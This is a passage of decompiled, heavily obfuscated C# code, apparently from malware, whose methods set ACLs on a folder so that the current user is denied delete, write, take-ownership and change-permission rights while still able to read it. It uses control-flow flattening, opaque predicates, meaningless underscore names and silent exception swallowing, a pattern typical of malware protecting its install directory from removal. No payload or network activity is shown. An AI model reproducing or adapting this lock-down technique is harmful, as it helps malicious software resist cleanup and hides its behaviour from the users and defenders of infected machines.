			directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			int num3 = default(int);
			if (num3 * 7 + num3 * 25 - 8868864 != (-3047 | num3) * 32 && num == 3335)
			{
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				num2 = sizeof(int) + 0;
				goto IL_0194;
			}
			goto IL_01e3;
			IL_01e3:
			directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			directorySecurity.SetAccessRuleProtection(isProtected: false, preserveInheritance: true);
			directoryInfo.SetAccessControl(directorySecurity);
			return;
			IL_00dd:
			directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.AppendData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			int num4 = default(int);
			num = (int)((num4 * 14 + num4 * 2 + 5100 == 7009) ? (sizeof(float) + -909701266) : ((nint)Type.EmptyTypes.LongLength + 3335));
			int num5 = default(int);
			num2 = ((~((num4 << 6) | (num5 * 262144)) == 64 * -num4) ? (sizeof(ushort) + 1989660861) : ((-(3831296 * num5) * 4 + 75048 == (num5 << 19) + 5557) ? (sizeof(byte) + -1974894255) : ((~(num3 + num3) != (int)((uint)num3 / 108435561u >> 31)) ? (sizeof(Guid) + -16) : (sizeof(int) + 780747020))));
			goto IL_0194;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void _________________(string string_0)
	{
		try
		{
			while (true)
			{
				string identity = Environment.UserName.ToString();
				DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
				int num = (int)((nint)Type.EmptyTypes.LongLength + 4317);
				______________________._______ = -1051365525;
				DirectorySecurity directorySecurity = new DirectorySecurity();
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
				int num2 = num;
				num = -28546;
				if (num2 != 8875)
				{
					goto IL_00d2;
				}
				goto IL_0123;
				IL_0123:
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				num2 = num;
				num = 18354;
				if (num2 == -18114 && ~((-6175 | num) - ((0x1168 & num) ^ 0xC8D)) != num - num * 512)
				{
					continue;
				}
				goto IL_00f9;
				IL_00d2:
				directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
				num2 = num;
				num = -1301;
				if (num2 == -9041)
				{
					goto IL_00f9;
				}
				goto IL_0123;
				IL_00f9:
				while (true)
				{
					directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					num2 = num;
					num = 1419;
					if (num2 == 18354)
					{
						int num3;
						do
						{
							directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
							num2 = num;
							num = -10838;
							num3 = _003CModule_003E._________________;
						}
						while ((uint)(~(num3 | -427)) / 134217728u != 2236098668u && num2 == 18730);
						directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
						num2 = num;
						num = -28145;
						if (num2 != -10838 || ((1853882368 * num << 3) | -1304) != -1304)
						{
						}
						directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
						if (num != -18286)
						{
							directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
							directorySecurity.AddAccessRule(new FileSystemAccessRule(identity, FileSystemRights.ListDirectory, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
							directoryInfo.SetAccessControl(directorySecurity);
							return;
						}
						continue;
					}
					break;
				}
				goto IL_00d2;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
